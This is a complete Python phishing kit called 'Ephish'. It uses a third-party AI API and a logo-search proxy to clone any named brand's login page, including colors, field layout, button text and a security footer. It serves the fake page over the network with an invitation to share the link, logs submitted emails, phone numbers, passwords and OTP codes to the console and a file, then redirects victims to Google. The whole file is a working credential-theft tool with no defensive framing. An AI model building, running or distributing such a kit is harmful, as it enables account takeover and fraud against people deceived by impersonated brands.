#!/usr/bin/env python3

import os
import sys
import time
import threading
import json
import random
import socket
import requests
from datetime import datetime
from flask import Flask, request, render_template_string, redirect

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

BANNER = f"""
{CYAN}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║   ███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗              ║
║   ██╔════╝██╔══██╗██║  ██║██║██╔════╝██║  ██║              ║
║   █████╗  ██████╔╝███████║██║███████╗███████║              ║
║   ██╔══╝  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║              ║
║   ███████╗██║     ██║  ██║██║███████║██║  ██║              ║
║   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝              ║
║                                                              ║
║           A I   P O W E R E D   P H I S H   M A K E R       ║
╚══════════════════════════════════════════════════════════════╝
{RESET}
"""

app = Flask(__name__)
page_config = {}
captured_data = []

def fetch_brand_logo(brand_name):
    try:
        search_query = f"official+logo+of+{brand_name.replace(' ', '+')}"
        url = f"https://microsoftdeepsearch.anshppt19.workers.dev/?search={search_query}&state=image&count=10"
        response = requests.get(url, timeout=10)
        data = response.json()
        if data.get('status') == 'success' and data['images']['results']:
            return data['images']['results'][0]
        return f"https://via.placeholder.com/200x200?text={brand_name}"
    except:
        return f"https://via.placeholder.com/200x200?text={brand_name}"

def ask_vrinda_ai(prompt):
    try:
        url = f"https://error-vrinda-ai-api.vercel.app/prompt?prompt={prompt.replace(' ', '+')}"
        response = requests.get(url, timeout=15)
        data = response.json()
        if data.get('success'):
            return data.get('response', '')
        return ""
    except:
        return ""

def get_brand_colors(brand_name):
    prompt = f"""Analyze brand '{brand_name}' official website login page. Return ONLY these 5 hex colors exactly in this format:
BACKGROUND: #XXXXXX
CONTAINER: #XXXXXX
TEXT: #XXXXXX
BUTTON_BG: #XXXXXX
BUTTON_TEXT: #XXXXXX

No extra text. Only these 5 lines."""
    
    response = ask_vrinda_ai(prompt)
    colors = {
        'bg': '#f5f5f5',
        'container': '#ffffff',
        'text': '#333333',
        'button_bg': '#ff5722',
        'button_text': '#ffffff'
    }
    
    for line in response.split('\n'):
        line = line.strip()
        if 'BACKGROUND:' in line:
            val = line.split(':')[1].strip()
            if val.startswith('#') and len(val) == 7:
                colors['bg'] = val
        elif 'CONTAINER:' in line:
            val = line.split(':')[1].strip()
            if val.startswith('#') and len(val) == 7:
                colors['container'] = val
        elif 'TEXT:' in line:
            val = line.split(':')[1].strip()
            if val.startswith('#') and len(val) == 7:
                colors['text'] = val
        elif 'BUTTON_BG:' in line:
            val = line.split(':')[1].strip()
            if val.startswith('#') and len(val) == 7:
                colors['button_bg'] = val
        elif 'BUTTON_TEXT:' in line:
            val = line.split(':')[1].strip()
            if val.startswith('#') and len(val) == 7:
                colors['button_text'] = val
    
    return colors

def get_login_fields(brand_name):
    prompt = f"""What fields does '{brand_name}' login page require? List them in order.
Examples:
Flipkart: email, password
Amazon: email, password
Zomato: mobile, password
Paytm: mobile, password, otp
WhatsApp: mobile, otp
Gmail: email, password
Instagram: username, password
Netflix: email, password

For {brand_name}, return ONLY the field names separated by commas, no extra text."""
    
    response = ask_vrinda_ai(prompt).lower()
    
    fields = []
    
    if 'email' in response and 'password' in response:
        fields = [
            {'label': 'Email Address', 'type': 'email', 'name': 'email'},
            {'label': 'Password', 'type': 'password', 'name': 'password'}
        ]
    elif 'mobile' in response and 'password' in response and 'otp' in response:
        fields = [
            {'label': 'Mobile Number', 'type': 'tel', 'name': 'mobile'},
            {'label': 'Password', 'type': 'password', 'name': 'password'},
            {'label': 'OTP', 'type': 'text', 'name': 'otp', 'maxlength': '6'}
        ]
    elif 'mobile' in response and 'password' in response:
        fields = [
            {'label': 'Mobile Number', 'type': 'tel', 'name': 'mobile'},
            {'label': 'Password', 'type': 'password', 'name': 'password'}
        ]
    elif 'mobile' in response and 'otp' in response:
        fields = [
            {'label': 'Mobile Number', 'type': 'tel', 'name': 'mobile'},
            {'label': 'OTP', 'type': 'text', 'name': 'otp', 'maxlength': '6'}
        ]
    elif 'username' in response and 'password' in response:
        fields = [
            {'label': 'Username', 'type': 'text', 'name': 'username'},
            {'label': 'Password', 'type': 'password', 'name': 'password'}
        ]
    else:
        fields = [
            {'label': 'Email or Mobile', 'type': 'text', 'name': 'username'},
            {'label': 'Password', 'type': 'password', 'name': 'password'}
        ]
    
    return fields

def get_welcome_text(brand_name):
    prompt = f"Create a short welcome header for {brand_name} login page. Return only the text, max 10 words."
    response = ask_vrinda_ai(prompt)
    if response and len(response) < 80:
        return response.strip()
    return f"Welcome to {brand_name}"

def get_footer_text(brand_name):
    prompt = f"Create a short security footer for {brand_name} login page. Return only the text, max 15 words."
    response = ask_vrinda_ai(prompt)
    if response and len(response) < 100:
        return response.strip()
    return f"Secure login • Protected by {brand_name}"

def get_button_text(brand_name):
    prompt = f"What is the login button text for {brand_name}? Return only the text like 'Sign In' or 'Login'."
    response = ask_vrinda_ai(prompt)
    if response and len(response) < 20:
        return response.strip()
    return "Sign In"

def create_phishing_page():
    brand = page_config['brand']
    logo = page_config['logo']
    colors = page_config['colors']
    inputs = page_config['inputs']
    welcome = page_config['welcome']
    footer = page_config['footer']
    button_text = page_config['button_text']
    
    input_html = ""
    for inp in inputs:
        attrs = f'type="{inp["type"]}" name="{inp["name"]}" placeholder="{inp["label"]}" required'
        if 'maxlength' in inp:
            attrs += f' maxlength="{inp["maxlength"]}"'
        input_html += f'<input {attrs} style="width:100%; padding:14px; margin:10px 0; border:1px solid #ddd; border-radius:8px; font-size:15px; box-sizing:border-box;">\n'
    
    html = f'''<!DOCTYPE html>
<html>
<head>
    <title>{brand} - Secure Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: {colors['bg']};
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            background: {colors['container']};
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }}
        .logo {{ margin-bottom: 24px; }}
        .logo img {{
            max-width: 140px;
            max-height: 140px;
            width: auto;
            height: auto;
        }}
        h2 {{ color: {colors['text']}; margin-bottom: 8px; font-size: 24px; }}
        .welcome {{ color: {colors['text']}; font-size: 14px; margin-bottom: 28px; opacity: 0.7; }}
        input {{
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 15px;
            box-sizing: border-box;
        }}
        input:focus {{
            outline: none;
            border-color: {colors['button_bg']};
        }}
        button {{
            width: 100%;
            padding: 14px;
            background: {colors['button_bg']};
            color: {colors['button_text']};
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }}
        button:hover {{ opacity: 0.9; }}
        .footer {{
            margin-top: 24px;
            font-size: 11px;
            color: {colors['text']};
            opacity: 0.5;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{logo}" alt="{brand}" onerror="this.src='https://via.placeholder.com/140x140?text={brand}'">
        </div>
        <h2>{brand}</h2>
        <div class="welcome">{welcome}</div>
        <form method="POST">
            {input_html}
            <button type="submit">{button_text}</button>
        </form>
        <div class="footer">{footer}</div>
    </div>
</body>
</html>'''
    return html

@app.route('/', methods=['GET', 'POST'])
def index():
    brand = page_config.get('brand', 'Secure Login')
    if request.method == 'POST':
        cred = {'brand': brand, 'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        for key, value in request.form.items():
            if value:
                cred[key] = value
        captured_data.append(cred)
        print(f"\n{RED}[!] CREDENTIALS CAPTURED!{RESET}")
        print(f"{YELLOW}Brand: {brand}{RESET}")
        for key, value in cred.items():
            if key not in ['brand', 'timestamp']:
                print(f"{YELLOW}{key}: {value}{RESET}")
        print(f"{YELLOW}Time: {cred['timestamp']}{RESET}\n")
        return redirect('https://www.google.com')
    return render_template_string(create_phishing_page())

def find_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def show_captured():
    while True:
        time.sleep(2)
        if captured_data:
            os.system('clear' if os.name == 'posix' else 'cls')
            print(BANNER)
            print(f"\n{CYAN}{'='*60}{RESET}")
            print(f"{GREEN}[+] CAPTURED CREDENTIALS ({len(captured_data)}){RESET}")
            print(f"{CYAN}{'='*60}{RESET}")
            for cred in captured_data:
                print(f"{YELLOW}Brand: {cred['brand']}{RESET}")
                for key, value in cred.items():
                    if key not in ['brand', 'timestamp']:
                        print(f"  {key}: {value}")
                print(f"  Time: {cred['timestamp']}")
                print(f"{CYAN}{'-'*40}{RESET}")

def save_captured():
    filename = f"phish_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w') as f:
        f.write(f"PHISH PAGE CAPTURED DATA\n")
        f.write(f"{'='*60}\n\n")
        for cred in captured_data:
            f.write(f"Brand: {cred['brand']}\n")
            for key, value in cred.items():
                if key not in ['brand', 'timestamp']:
                    f.write(f"{key}: {value}\n")
            f.write(f"Time: {cred['timestamp']}\n")
            f.write(f"{'-'*40}\n\n")
    return filename

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    
    print(f"{CYAN}🤖 AI POWERED PHISHING PAGE MAKER{RESET}\n")
    
    brand = input(f"{GREEN}Enter Brand Name: {RESET}").strip()
    while not brand:
        brand = input(f"{RED}Brand name required: {RESET}").strip()
    
    print(f"\n{CYAN}[*] Fetching brand logo...{RESET}")
    logo = fetch_brand_logo(brand)
    print(f"{GREEN}[+] Logo fetched!{RESET}")
    
    print(f"{CYAN}[*] AI analyzing brand colors...{RESET}")
    colors = get_brand_colors(brand)
    print(f"{GREEN}[+] Colors ready!{RESET}")
    
    print(f"{CYAN}[*] AI determining login fields...{RESET}")
    inputs = get_login_fields(brand)
    print(f"{GREEN}[+] Found {len(inputs)} fields: {', '.join([i['label'] for i in inputs])}{RESET}")
    
    print(f"{CYAN}[*] AI generating welcome text...{RESET}")
    welcome = get_welcome_text(brand)
    print(f"{GREEN}[+] Welcome text ready!{RESET}")
    
    print(f"{CYAN}[*] AI generating footer...{RESET}")
    footer = get_footer_text(brand)
    print(f"{GREEN}[+] Footer ready!{RESET}")
    
    print(f"{CYAN}[*] AI getting button text...{RESET}")
    button_text = get_button_text(brand)
    print(f"{GREEN}[+] Button: {button_text}{RESET}")
    
    page_config['brand'] = brand
    page_config['logo'] = logo
    page_config['colors'] = colors
    page_config['inputs'] = inputs
    page_config['welcome'] = welcome
    page_config['footer'] = footer
    page_config['button_text'] = button_text
    
    print(f"\n{GREEN}{'='*60}{RESET}")
    print(f"{GREEN}✅ PAGE READY!{RESET}")
    print(f"{GREEN}{'='*60}{RESET}")
    print(f"{YELLOW}Type /r to run the page{RESET}")
    print(f"{YELLOW}Type /q to quit{RESET}")
    
    while True:
        cmd = input(f"\n{GREEN}Ephish> {RESET}").strip().lower()
        
        if cmd == '/r':
            local_ip = find_local_ip()
            port = random.randint(8000, 9000)
            
            print(f"\n{CYAN}[+] Server starting...{RESET}")
            print(f"{GREEN}[+] Local: http://127.0.0.1:{port}/{RESET}")
            print(f"{GREEN}[+] Network: http://{local_ip}:{port}/{RESET}")
            print(f"{YELLOW}[+] Share this link{RESET}")
            print(f"{RED}[!] Press Ctrl+C to stop{RESET}\n")
            
            monitor_thread = threading.Thread(target=show_captured, daemon=True)
            monitor_thread.start()
            
            try:
                app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] Server stopped{RESET}")
                if captured_data:
                    filename = save_captured()
                    print(f"{GREEN}[+] Saved {len(captured_data)} credentials to: {filename}{RESET}")
        
        elif cmd == '/q':
            print(f"{GREEN}[+] Goodbye!{RESET}")
            sys.exit(0)
        
        else:
            print(f"{RED}[!] Use /r to run or /q to quit{RESET}")

if __name__ == "__main__":
    main()